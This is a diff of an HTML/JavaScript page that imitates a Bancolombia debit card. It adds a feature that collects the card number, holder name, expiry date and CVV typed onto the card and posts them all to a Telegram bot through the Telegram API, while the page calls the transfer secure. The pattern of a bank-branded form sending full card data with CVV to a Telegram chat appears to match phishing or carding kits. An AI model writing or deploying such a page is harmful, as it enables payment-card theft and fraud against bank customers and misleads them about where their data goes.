@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Tarjeta Débito Bancolombia | Experiencia Inmersiva</title>
+<title>Tarjeta Débito Bancolombia | Envío a Telegram</title>
 <style>
     * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
-        user-select: none; /* Mejora la sensación de tarjeta física, pero inputs internos serán editables */
+        user-select: none; /* mejor sensación de tarjeta física */
     }
 
     body {
@@ -22,24 +22,22 @@
         padding: 24px;
     }
 
-    /* Contenedor principal con sensación bancaria */
     .wrapper {
-        max-width: 500px;
+        max-width: 520px;
         width: 100%;
         margin: 0 auto;
     }
 
-    /* Efecto de profundidad y sombra entorno a la tarjeta */
+    /* Contenedor de la tarjeta con efecto 3D */
     .card-stage {
         perspective: 1200px;
         margin-bottom: 32px;
-        cursor: pointer;
     }
 
     .card {
         position: relative;
         width: 100%;
-        aspect-ratio: 85 / 54; /* proporción elegante 1.57 similar a débito */
+        aspect-ratio: 85 / 54;
         border-radius: 28px;
         transform-style: preserve-3d;
         transition: transform 0.65s cubic-bezier(0.23, 1, 0.32, 1);
@@ -60,7 +58,7 @@
         box-shadow: inset 0 1px 2px rgba(255,255,255,0.5), 0 4px 12px rgba(0,0,0,0.1);
     }
 
-    /* FRONT - diseño corporativo Bancolombia (dorado/amarillo vibrante + detalles sobrios) */
+    /* FRONT - Diseño Bancolombia */
     .front {
         background: radial-gradient(circle at 10% 20%, #FFD700, #F9A800);
         background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100" opacity="0.08"><path fill="none" stroke="%231a1a1a" stroke-width="1.2" d="M0,20 L200,20 M0,40 L200,40 M0,60 L200,60 M0,80 L200,80 M40,0 L40,100 M80,0 L80,100 M120,0 L120,100 M160,0 L160,100"/><circle cx="50" cy="50" r="8" fill="%23111111" opacity="0.2"/><circle cx="150" cy="30" r="12" fill="%23111111" opacity="0.2"/></svg>');
@@ -86,7 +84,6 @@
         letter-spacing: -0.5px;
         color: #0c2b1f;
         text-shadow: 0 1px 0 rgba(255,245,160,0.6);
-        font-family: 'Segoe UI', 'Inter', sans-serif;
     }
 
     .badge {
@@ -97,7 +94,6 @@
         font-size: 0.7rem;
         font-weight: 700;
         color: #111;
-        letter-spacing: 0.6px;
     }
 
     .chip-area {
@@ -124,7 +120,6 @@
         border-radius: 4px;
     }
 
-    /* Campo de número editable */
     .card-number-editable {
         margin-top: 16px;
         margin-bottom: 8px;
@@ -186,13 +181,7 @@
         padding: 2px 0;
     }
 
-    .expiry-cvc-row {
-        display: flex;
-        gap: 20px;
-        margin-top: 10px;
-    }
-
-    /* REVERSE (BACK) */
+    /* BACK */
     .back {
         background: linear-gradient(145deg, #f7cd5c, #eda512);
         transform: rotateY(180deg);
@@ -223,7 +212,6 @@
         font-size: 0.7rem;
         font-weight: 700;
         color: #423a28;
-        letter-spacing: 1px;
     }
 
     .cvc-input {
@@ -246,149 +234,200 @@
         font-size: 0.6rem;
         font-weight: 500;
         color: #212121;
-        opacity: 0.7;
     }
 
-    /* Mensaje y estilo de instrucción */
-    .instruction {
-        background: rgba(255,255,245,0.85);
-        backdrop-filter: blur(8px);
+    /* Panel de configuración de Telegram */
+    .telegram-config {
+        background: rgba(255,255,245,0.96);
+        backdrop-filter: blur(4px);
         border-radius: 28px;
-        padding: 12px 20px;
-        text-align: center;
-        font-size: 0.8rem;
-        font-weight: 500;
-        color: #2a411c;
-        margin-top: 24px;
-        border: 1px solid rgba(255,215,0,0.5);
-        box-shadow: 0 6px 14px rgba(0,0,0,0.05);
+        padding: 18px 20px;
+        margin-top: 20px;
+        border: 1px solid #ffd966;
+        box-shadow: 0 8px 20px rgba(0,0,0,0.08);
     }
 
-    .instruction span {
-        background: #f4b800;
-        padding: 3px 12px;
-        border-radius: 40px;
-        color: #1a2e0e;
-        font-weight: 700;
+    .config-title {
+        font-weight: 800;
+        font-size: 0.85rem;
+        color: #2b4b2b;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-bottom: 12px;
+    }
+
+    .config-input-group {
+        margin-bottom: 12px;
+    }
+
+    .config-input-group label {
         font-size: 0.7rem;
-        margin: 0 4px;
+        font-weight: 600;
+        color: #3a2a1a;
+        display: block;
+        margin-bottom: 4px;
     }
 
-    /* Efectos hover en campos */
-    .card-number-input:focus, .editable-value:focus, .cvc-input:focus {
-        background: rgba(255,255,210,0.5);
-        border-radius: 8px;
-        padding-left: 6px;
-        transition: 0.1s;
+    .config-input-group input {
+        width: 100%;
+        padding: 10px 14px;
+        border-radius: 40px;
+        border: 1px solid #e2c28b;
+        background: white;
+        font-size: 0.85rem;
+        outline: none;
+        transition: 0.2s;
     }
 
-    /* adaptación responsive */
-    @media (max-width: 480px) {
-        .card-number-input {
-            font-size: 1.2rem;
-            letter-spacing: 1px;
-        }
-        .bank-name {
-            font-size: 1.4rem;
-        }
-        .front {
-            padding: 18px;
-        }
+    .config-input-group input:focus {
+        border-color: #f5b81b;
+        box-shadow: 0 0 0 2px rgba(245,184,27,0.3);
     }
 
-    /* pequeña animación de "escribe en la tarjeta" */
-    @keyframes gentlePulse {
-        0% { opacity: 0.6; }
-        100% { opacity: 1; }
+    .btn-send {
+        background: linear-gradient(95deg, #2b6e3c, #1f4f2a);
+        border: none;
+        width: 100%;
+        padding: 12px;
+        border-radius: 40px;
+        color: white;
+        font-weight: 700;
+        font-size: 1rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        cursor: pointer;
+        transition: 0.2s;
+        margin-top: 8px;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.2);
     }
+
+    .btn-send:hover {
+        background: linear-gradient(95deg, #1f582d, #15411f);
+        transform: scale(0.98);
+    }
+
+    .status-msg {
+        font-size: 0.7rem;
+        margin-top: 12px;
+        text-align: center;
+        color: #2a5935;
+        font-weight: 500;
+        background: #eef4e6;
+        padding: 8px;
+        border-radius: 40px;
+    }
+
     .instruction {
-        animation: gentlePulse 1.5s infinite alternate;
+        background: rgba(255,248,220,0.9);
+        border-radius: 24px;
+        padding: 10px 16px;
+        text-align: center;
+        font-size: 0.75rem;
+        margin-bottom: 16px;
+        color: #664d1a;
+        font-weight: 500;
+    }
+
+    @media (max-width: 480px) {
+        .card-number-input { font-size: 1.2rem; letter-spacing: 1px; }
+        .front { padding: 18px; }
     }
 </style>
 </head>
 <body>
-
 <div class="wrapper">
+    <div class="instruction">
+        💳 Escribe directamente SOBRE la tarjeta: número, titular, fecha y CVV. <br>
+        Luego configura tu Bot de Telegram y envía los datos de forma segura.
+    </div>
+
     <div class="card-stage">
         <div class="card" id="creditCard">
-            <!-- FRENTE TARJETA -->
+            <!-- FRENTE -->
             <div class="card-face front">
                 <div class="bank-header">
                     <div class="bank-name">Bancolombia</div>
                     <div class="badge">DÉBITO</div>
                 </div>
-
-                <div class="chip-area">
-                    <div class="sim-chip"></div>
-                </div>
-
-                <!-- NÚMERO DE TARJETA -> editable directamente en tarjeta -->
+                <div class="chip-area"><div class="sim-chip"></div></div>
                 <div class="card-number-editable">
                     <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric" value="4532 1234 5678 9123">
                 </div>
-
-                <!-- FILA TITULAR + FECHA VENCIMIENTO (editable directo) -->
                 <div class="info-row">
                     <div class="info-group" style="flex: 2;">
                         <div class="label">TITULAR</div>
-                        <input type="text" id="cardHolderInput" class="editable-value" placeholder="NOMBRE DEL TITULAR" value="SOFIA RESTREPO G." maxlength="30" style="text-transform:uppercase">
+                        <input type="text" id="cardHolderInput" class="editable-value" placeholder="NOMBRE DEL TITULAR" value="SOFIA RESTREPO G." maxlength="35" style="text-transform:uppercase">
                     </div>
                     <div class="info-group">
                         <div class="label">VENCE</div>
                         <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" value="09/28" maxlength="5" style="width: 75px;">
                     </div>
                 </div>
-                <!-- Pequeño detalle: red de pagos -->
-                <div style="margin-top: 12px; font-size: 0.5rem; font-weight: 500; display: flex; gap: 8px;">
+                <div style="margin-top: 12px; font-size: 0.5rem; display: flex; gap: 8px;">
                     <span>⭐ Visa Debit</span>
                     <span>Seguridad Chip</span>
                 </div>
             </div>
-
-            <!-- REVERSO TARJETA (CVC editable directo) -->
+            <!-- REVERSO -->
             <div class="card-face back">
                 <div class="black-strip"></div>
                 <div class="cvc-container">
                     <span class="cvc-label">CVV2 / CVC</span>
                     <input type="text" id="cvcInput" class="cvc-input" maxlength="3" placeholder="123" value="456" inputmode="numeric">
                 </div>
-                <div class="back-footer">
-                    <small>Banco de confianza • Banca segura</small>
-                </div>
-                <!-- franja banda magnética ficticia -->
+                <div class="back-footer"><small>Banco de confianza • Banca segura</small></div>
                 <div style="background: #442200; width: 100%; height: 12px; margin-top: 18px; opacity: 0.5;"></div>
             </div>
         </div>
     </div>
 
-    <div class="instruction">
-        💳 <strong>Escribe directamente sobre la tarjeta</strong> — Haz clic en cualquier dato (número, titular, fecha o CVV) y edítalos allí mismo.  
-        <span>✨ Sin inputs externos</span>
+    <!-- Configuración de Telegram (ID y Token) -->
+    <div class="telegram-config">
+        <div class="config-title">
+            🤖 <span>CONECTAR CON TELEGRAM</span>
+        </div>
+        <div class="config-input-group">
+            <label>📌 BOT TOKEN</label>
+            <input type="text" id="botToken" placeholder="Ej: 7891234567:AAHdqTcvCH1vGWJYSeR...">
+        </div>
+        <div class="config-input-group">
+            <label>👤 CHAT ID</label>
+            <input type="text" id="chatId" placeholder="Ej: 123456789 o @username">
+        </div>
+        <button class="btn-send" id="sendToTelegramBtn">
+            ✈️ ENVIAR DATOS DE TARJETA A TELEGRAM
+        </button>
+        <div id="telegramStatus" class="status-msg">⚙️ Ingresa Token y Chat ID para enviar</div>
     </div>
 </div>
 
 <script>
     (function() {
-        // Elementos de la tarjeta y campos editables internos
+        // ---------- Elementos de la tarjeta ----------
         const cardElement = document.getElementById('creditCard');
         const numberInput = document.getElementById('cardNumberInput');
         const holderInput = document.getElementById('cardHolderInput');
         const expiryInput = document.getElementById('expiryInput');
         const cvcInputElem = document.getElementById('cvcInput');
+        
+        // Campos de configuración Telegram
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
+        const sendBtn = document.getElementById('sendToTelegramBtn');
+        const statusDiv = document.getElementById('telegramStatus');
 
-        // === 1. Lógica de formateo para el número de tarjeta: Espacios cada 4 dígitos ===
+        // ---------- Formateo y utilidades de la tarjeta (sin inputs externos) ----------
         function formatCardNumber(value) {
-            // Remover todo lo que no sea dígito
             let cleaned = value.replace(/\D/g, '');
-            // Limitar a 16 dígitos típico débito
             if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
-            // Agrupar de a 4
             let parts = [];
             for (let i = 0; i < cleaned.length; i += 4) {
                 parts.push(cleaned.slice(i, i + 4));
             }
-            let formatted = parts.join(' ');
-            return formatted;
+            return parts.join(' ');
         }
 
         function updateNumberFormat() {
@@ -397,26 +436,19 @@
             if (formatted !== numberInput.value) {
                 numberInput.value = formatted;
             }
-            // Si el usuario borra todo, placeholder amigable
-            if (numberInput.value === '') {
-                numberInput.placeholder = "**** **** **** ****";
-            } else {
-                numberInput.placeholder = "";
-            }
+            if (numberInput.value === '') numberInput.placeholder = "**** **** **** ****";
+            else numberInput.placeholder = "";
         }
 
         numberInput.addEventListener('input', function(e) {
-            // Guardar posición del cursor para evitar saltos agresivos
             let cursorPos = numberInput.selectionStart;
             let rawBefore = numberInput.value;
             updateNumberFormat();
             let newLen = numberInput.value.length;
-            // ajuste de cursor simple: si se agregó un espacio después del cuarto carácter reajustar
             if (newLen > rawBefore.length && (cursorPos % 5 === 0) && cursorPos > 0) {
                 numberInput.selectionStart = cursorPos + 1;
                 numberInput.selectionEnd = cursorPos + 1;
             } else if (newLen < rawBefore.length && rawBefore[cursorPos] === ' ') {
-                // al borrar un espacio, mover cursor atrás
                 numberInput.selectionStart = cursorPos;
                 numberInput.selectionEnd = cursorPos;
             } else {
@@ -424,127 +456,54 @@
                 numberInput.selectionEnd = cursorPos;
             }
         });
-
-        // aplicar formato inicial si existe valor
         updateNumberFormat();
 
-        // 2. Formateo para fecha de vencimiento (MM/AA)
+        // Formato fecha (MM/AA)
         function formatExpiry(value) {
             let digits = value.replace(/\D/g, '');
             if (digits.length > 4) digits = digits.slice(0,4);
-            if (digits.length >= 3) {
-                return digits.slice(0,2) + '/' + digits.slice(2,4);
-            } else if (digits.length === 2) {
-                return digits;
-            } else {
-                return digits;
-            }
+            if (digits.length >= 3) return digits.slice(0,2) + '/' + digits.slice(2,4);
+            else if (digits.length === 2) return digits;
+            else return digits;
         }
-
         function handleExpiryInput(e) {
             let input = e.target;
-            let raw = input.value;
-            let formatted = formatExpiry(raw);
-            // Si el usuario está escribiendo después de la barra, manejar
-            if (formatted !== raw) {
-                input.value = formatted;
-            }
-            // control para no pasar de 5 caracteres (MM/AA)
+            let formatted = formatExpiry(input.value);
+            if (formatted !== input.value) input.value = formatted;
             if (input.value.length > 5) input.value = input.value.slice(0,5);
-            // Si el campo queda vacío, placeholder
         }
-
         expiryInput.addEventListener('input', handleExpiryInput);
-        expiryInput.addEventListener('blur', function() {
-            let val = expiryInput.value;
-            let onlyDigits = val.replace(/\D/g,'');
-            if (onlyDigits.length === 3) {
-                // caso raro, forzar formato correcto
-                expiryInput.value = onlyDigits.slice(0,2) + '/' + onlyDigits.slice(2,3);
-            } else if (onlyDigits.length === 2 && !val.includes('/')) {
-                expiryInput.value = onlyDigits;
-            } else if (onlyDigits.length === 4 && !val.includes('/')) {
-                expiryInput.value = onlyDigits.slice(0,2) + '/' + onlyDigits.slice(2,4);
-            } else if (onlyDigits.length === 0) {
-                expiryInput.placeholder = "MM/AA";
-            } else {
-                // si termina con "/" y solo hay dos digitos, está bien
-                if (val === '0/' || val === '1/') expiryInput.value = val;
-            }
+        expiryInput.addEventListener('blur', () => {
             if (expiryInput.value === '') expiryInput.placeholder = "MM/AA";
         });
-        // trigger inicial para posibles valores predeterminados
         if(expiryInput.value) handleExpiryInput({target: expiryInput});
 
-        // 3. Manejo de mayúsculas automáticas para el nombre del titular
+        // Titular mayúsculas automáticas
         holderInput.addEventListener('input', function(e) {
-            let value = e.target.value;
-            let upperValue = value.toUpperCase();
-            if (upperValue !== value) {
-                e.target.value = upperValue;
-            }
-            // limpiar caracteres extraños? mantener letras, espacios, puntos
+            let upper = e.target.value.toUpperCase();
+            if (upper !== e.target.value) e.target.value = upper;
             let sanitized = e.target.value.replace(/[^A-Z\s\.Ñ]/g, '');
-            if (sanitized !== e.target.value) {
-                e.target.value = sanitized;
-            }
-            // placeholder dinámico
-            if (e.target.value === '') {
-                holderInput.placeholder = "NOMBRE DEL TITULAR";
-            }
+            if (sanitized !== e.target.value) e.target.value = sanitized;
         });
 
-        holderInput.addEventListener('blur', function() {
-            if (holderInput.value.trim() === '') {
-                holderInput.placeholder = "NOMBRE DEL TITULAR";
-            } else {
-                holderInput.placeholder = "";
-            }
-        });
-
-        // 4. CVC: solo números y longitud máxima 3, con flip automático al hacer foco (estilo bancolombia interactivo)
+        // CVC solo números y longitud 3
         cvcInputElem.addEventListener('input', function(e) {
             let val = e.target.value.replace(/\D/g, '');
             if (val.length > 3) val = val.slice(0,3);
             e.target.value = val;
-            if (val === '') e.target.placeholder = "123";
         });
 
-        // FLIP de tarjeta cuando el campo CVC está activo (cómo en demo original pero refinado)
-        cvcInputElem.addEventListener('focus', function() {
-            cardElement.classList.add('flipped');
-        });
-        cvcInputElem.addEventListener('blur', function() {
-            cardElement.classList.remove('flipped');
-        });
+        // FLIP de la tarjeta al enfocar CVC
+        cvcInputElem.addEventListener('focus', () => cardElement.classList.add('flipped'));
+        cvcInputElem.addEventListener('blur', () => cardElement.classList.remove('flipped'));
 
-        // Extras: también permitir que se pueda ocultar el flip si el usuario hace clic fuera, pero mantendremos lógica.
-        // Si el usuario hace foco en número o titular, aseguramos que la tarjeta esté frontal (por buena experiencia)
         const frontInputs = [numberInput, holderInput, expiryInput];
-        frontInputs.forEach(input => {
-            input.addEventListener('focus', () => {
-                if (cardElement.classList.contains('flipped')) {
-                    cardElement.classList.remove('flipped');
-                }
-            });
-        });
+        frontInputs.forEach(inp => inp.addEventListener('focus', () => {
+            if (cardElement.classList.contains('flipped')) cardElement.classList.remove('flipped');
+        }));
 
-        // Evitar que el espacio gire la tarjeta accidentalmente, solo el CVV provoca giro (estándar)
-        // Prevenir que el CVC tenga más de 3 digitos y sea numérico
-        cvcInputElem.addEventListener('keydown', function(e) {
-            // Permitir control, backspace, delete, tab
-            if (e.key === ' ' || e.key === 'Space') {
-                e.preventDefault();
-            }
-        });
-
-        // Validación extra: El número de tarjeta no debe permitir letras
+        // Prevenir espacios no deseados en número
         numberInput.addEventListener('keydown', function(e) {
-            const allowedKeys = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', ' ', 'Space'];
-            if (!allowedKeys.includes(e.key) && !/^[0-9]$/.test(e.key) && e.key !== ' ' && e.key !== 'Space') {
-                e.preventDefault();
-            }
-            // permitir espacio pero lo gestiona el formateo
             if (e.key === ' ' || e.key === 'Space') {
                 e.preventDefault();
                 let val = numberInput.value;
@@ -552,60 +511,114 @@
                 let newVal = val.slice(0, cursorPos) + ' ' + val.slice(cursorPos);
                 numberInput.value = newVal.slice(0,19);
                 numberInput.selectionStart = cursorPos + 1;
-                numberInput.selectionEnd = cursorPos + 1;
                 updateNumberFormat();
-            }
-        });
-
-        // Para la fecha, asegurar que solo números y '/' manual
-        expiryInput.addEventListener('keydown', function(e) {
-            if (e.key === '/') {
-                // Permitir slash, pero el formato lo maneja input
-                return;
-            }
-            if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
+            } else if (!/^[0-9]$/.test(e.key) && !['Backspace','Delete','ArrowLeft','ArrowRight','Tab'].includes(e.key)) {
                 e.preventDefault();
             }
         });
 
-        // Sincronizar consistencia visual inicial: Si CVC tiene valor, display correcto
-        // También sincronizamos el placeholder para números
-        if (numberInput.value.trim() === '') {
-            numberInput.placeholder = "**** **** **** ****";
-        } else {
-            numberInput.placeholder = "";
-        }
+        // ========== FUNCIÓN PARA ENVIAR DATOS A TELEGRAM (usando fetch) ==========
+        async function sendToTelegram() {
+            const botToken = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
 
-        // detalle extra: el banco se muestra coherente con fondo y texto
-        // Para mejorar UX, si el usuario escribe el número y supera 19 caracteres, el formateo lo trunca
-        function finalFormatCheck() {
-            updateNumberFormat();
-            if (expiryInput.value) handleExpiryInput({target: expiryInput});
-            let cvcVal = cvcInputElem.value.replace(/\D/g,'');
-            if(cvcVal.length > 3) cvcInputElem.value = cvcVal.slice(0,3);
-            // titular en mayúscula siempre
-            if(holderInput.value !== holderInput.value.toUpperCase()) {
-                holderInput.value = holderInput.value.toUpperCase();
+            if (!botToken || !chatId) {
+                statusDiv.innerHTML = "⚠️ Debes ingresar el TOKEN del Bot y el CHAT ID de Telegram.";
+                statusDiv.style.color = "#a12a2a";
+                statusDiv.style.background = "#ffe6e6";
+                return;
+            }
+
+            // Recoger datos actuales de la tarjeta directamente desde los inputs internos
+            let cardNumberRaw = numberInput.value.replace(/\s/g, '');  // sin espacios
+            if (!cardNumberRaw) cardNumberRaw = "No especificado";
+            let cardHolder = holderInput.value.trim() || "SIN NOMBRE";
+            let expiryDate = expiryInput.value.trim() || "00/00";
+            let cvcCode = cvcInputElem.value.trim() || "000";
+
+            // Construir mensaje con formato amigable
+            const message = `🏦 *DATOS DE TARJETA BANCOLOMBIA* 🏦\n\n` +
+                            `💳 *Número:* \`${cardNumberRaw}\`\n` +
+                            `👤 *Titular:* ${cardHolder}\n` +
+                            `📅 *Vencimiento:* ${expiryDate}\n` +
+                            `🔐 *CVV/CVC:* ${cvcCode}\n\n` +
+                            `🕒 ${new Date().toLocaleString()}\n` +
+                            `✅ Datos extraídos directamente desde la tarjeta virtual.`;
+
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            statusDiv.innerHTML = "📡 Enviando información a Telegram...";
+            statusDiv.style.color = "#2a5935";
+            statusDiv.style.background = "#eef4e6";
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    statusDiv.innerHTML = "✅ ¡Datos enviados con éxito! Revisa tu bot de Telegram.";
+                    statusDiv.style.background = "#dcfce7";
+                    statusDiv.style.color = "#14532d";
+                    // Limpiar mensaje de éxito después de 5 segundos opcional
+                    setTimeout(() => {
+                        if(statusDiv.innerHTML.includes("éxito")) {
+                            // no sobreescribir si hubo otro cambio
+                        }
+                    }, 4000);
+                } else {
+                    let errorDesc = data.description || "Error desconocido";
+                    statusDiv.innerHTML = `❌ Error al enviar: ${errorDesc}. Verifica Token/Chat ID.`;
+                    statusDiv.style.background = "#ffe0e0";
+                    statusDiv.style.color = "#b91c1c";
+                    console.error("Telegram error:", data);
+                }
+            } catch (error) {
+                console.error("Fetch error:", error);
+                statusDiv.innerHTML = "⚠️ Error de conexión. No se pudo enviar a Telegram. Revisa tu red o el Token.";
+                statusDiv.style.background = "#fff0e0";
+                statusDiv.style.color = "#b45f1b";
             }
         }
 
-        window.addEventListener('load', () => {
-            finalFormatCheck();
-            // Si la tarjeta muestra el CVV y alguien escribe, aseguramos no tenga giro residual
-            if(cvcInputElem === document.activeElement) {
-                cardElement.classList.add('flipped');
+        // Evento del botón
+        sendBtn.addEventListener('click', sendToTelegram);
+
+        // También se podría enviar con atajo, pero solo con clic.
+        // Agregar pequeña notificación si token incompleto
+        function validateTelegramFields() {
+            if(botTokenInput.value && chatIdInput.value){
+                statusDiv.innerHTML = "✅ Configuración lista. Presiona 'ENVIAR DATOS' para enviar la información de la tarjeta a Telegram.";
+                statusDiv.style.background = "#e6f4ea";
+                statusDiv.style.color = "#1f5420";
             } else {
-                cardElement.classList.remove('flipped');
+                statusDiv.innerHTML = "⚙️ Ingresa el Token de tu Bot y el Chat ID para activar el envío a Telegram.";
+                statusDiv.style.background = "#fef7e0";
+                statusDiv.style.color = "#7c5a1a";
             }
+        }
+
+        botTokenInput.addEventListener('input', validateTelegramFields);
+        chatIdInput.addEventListener('input', validateTelegramFields);
+        validateTelegramFields();
+
+        // Mejora de experiencia: si el usuario quiere enviar usando Enter dentro de los campos? opcional
+        const inputsConfig = [botTokenInput, chatIdInput];
+        inputsConfig.forEach(inp => {
+            inp.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') sendToTelegram();
+            });
         });
 
-        // Al hacer clic en cualquier área de la tarjeta, si se hace clic en el reverso mientras no está enfocado CVV,
-        // Pero se mejora: El cvc al hacer focus hará flip. Para desflip, se puede hacer click en frontal
-        // Adicional: Si se hace clic en el campo cvc manualmente y está detrás, el flip funciona, perfecto.
-        // También se añade comportamiento para teclas de envío de formulario? no necesario.
-
-        // Eliminamos cualquier input externo, solo los de la tarjeta.
-        console.log("Tarjeta interactiva estilo Bancolombia — Edición directa sobre la tarjeta débito.");
+        // Finalmente, asegurar que los datos siempre se lean en tiempo real de la tarjeta (es directo)
+        console.log("Tarjeta interactiva Bancolombia - Envío a Telegram funcional");
     })();
 </script>
 </body>
